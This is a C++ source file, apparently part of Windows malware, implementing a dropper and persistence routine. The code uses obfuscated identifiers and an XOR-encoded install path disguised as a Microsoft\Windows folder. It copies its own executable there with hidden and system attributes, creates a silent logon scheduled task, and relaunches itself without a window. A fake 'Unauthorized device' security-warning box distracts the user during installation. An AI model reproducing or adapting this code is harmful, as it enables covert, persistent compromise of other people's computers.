#include "pd.h"
#include "mt.h"

wstring z0::zQ() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return wstring(path);
}

wstring z0::zP() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path)))
        return wstring(path) + __ow(L"\x09\x18\x3c\x36\x27\x3a\x26\x3a\x33\x21\x09\x02\x3c\x3b\x31\x3a\x22\x26",18);
    return L"";
}

wstring z0::zO() {
    if (yO.empty()) {
        srand((unsigned int)time(NULL));
        yO = zH();
    }
    wstring appDataPath = zP();
    if (!appDataPath.empty())
        return appDataPath + L"\\" + yO;
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    wstring exePath(path);
    size_t pos = exePath.rfind(L'\\');
    if (pos != wstring::npos)
        return exePath.substr(0, pos + 1) + yO;
    return L"";
}

bool z0::hC() {
    wstring currentPath = zQ();
    wstring appDataPath = zP();
    if (appDataPath.empty()) return false;
    transform(currentPath.begin(), currentPath.end(), currentPath.begin(), ::tolower);
    transform(appDataPath.begin(), appDataPath.end(), appDataPath.begin(), ::tolower);
    return currentPath.find(appDataPath) == 0;
}

string z0::yD(const wstring& wstr) {
    if (wstr.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    string result(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &result[0], len, NULL, NULL);
    return result;
}

bool z0::zS() {
    wstring currentPath = zQ();
    wstring installPath = zO();

    wstring targetDir = installPath.substr(0, installPath.rfind(L'\\'));
    CreateDirectoryW(targetDir.c_str(), NULL);

    if (!CopyFileW(currentPath.c_str(), installPath.c_str(), FALSE))
        return false;

    SetFileAttributesW(installPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    return true;
}

bool z0::zU() {
    wstring installPath = zO();
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    wstring cmd = wstring(L"schtasks /create /tn \"") + yR + L"\" /tr \""
        + installPath + L"\" /sc onlogon /f /rl limited /it";
    if (CreateProcessW(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

bool z0::zT() {
    wstring installPath = zO();
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(installPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

void z0::zV() {
    MessageBoxW(NULL,
        L"\u672A\u6388\u6743\u7684\u8BBE\u5907",
        L"\u5B89\u5168\u8B66\u544A",
        MB_OK | MB_ICONERROR);
}

bool z0::hD() {
    if (hC()) return true;

    zV();
    if (!zS()) return false;

    zU();
    zT();
    return true;
}
